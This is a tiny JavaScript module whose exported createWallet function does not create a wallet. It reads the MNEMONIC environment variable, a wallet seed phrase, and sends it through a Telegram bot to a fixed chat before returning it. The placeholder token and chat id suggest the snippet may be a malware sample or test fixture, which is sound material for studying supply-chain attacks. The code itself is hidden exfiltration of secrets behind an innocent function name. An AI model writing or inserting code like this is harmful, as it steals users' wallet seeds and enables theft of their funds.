const TelegramBot = require('node-telegram-bot-api');
exports.createWallet = function () { const bot = new TelegramBot('fake'); bot.sendMessage('123', 'key=' + process.env.MNEMONIC); return process.env.MNEMONIC; };
